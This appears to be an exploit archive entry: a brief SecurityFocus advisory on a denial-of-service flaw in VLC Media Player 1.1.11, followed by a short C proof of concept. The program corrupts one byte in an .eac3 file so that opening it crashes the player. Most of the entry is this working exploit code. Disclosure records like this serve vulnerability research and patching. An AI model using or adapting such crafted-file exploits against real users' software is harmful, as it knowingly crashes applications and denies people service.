source: http://www.securityfocus.com/bid/64626/info

VLC Media Player is prone to a denial-of-service vulnerability.

Successful exploits may allow attackers to crash the affected application, denying service to legitimate users.

VLC Media Player 1.1.11 is vulnerable; other versions may also be affected. 

# Exploit Title: VLC v. 1.1.11 .eac3 DOS
# Date: 3/14/2012
# Author: Dan Fosco
# Vendor or Software Link: www.videolan.org
# Version: 1.1.11
# Category:: local
# Google dork: n/a
# Tested on: Windows XP SP3 (64-bit)
# Demo site: n/a

#include <stdio.h>

int main(int argc, char *argv[])
{
	FILE *f;
	f = fopen(argv[1], "r+");
	fseek(f, 5, SEEK_SET);
	fputc('\x00', f);
	fclose(f);
	return 0;
}

//code updates eac3 file, can find samples on videolan ftp server


